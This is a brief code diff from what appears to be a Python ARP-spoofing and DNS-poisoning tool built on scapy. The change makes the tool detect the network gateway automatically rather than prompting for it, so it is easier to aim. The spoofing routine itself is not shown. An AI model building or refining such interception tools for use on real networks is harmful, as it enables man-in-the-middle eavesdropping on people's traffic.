@@ -28,7 +28,7 @@ print("1. ARP spoofing \n2. DNS poisoning")
 arp_dns=input()
 if arp_dns == '1':
     target_ip=input("Please input the target IP: ")
-    gateway_ip=input("Please input the router IP: ")
+    gateway_ip=scapy.conf.route.route("0.0.0.0")[2]
     try:
         sent_packets=0
         print("Starting ARP spoofing...")
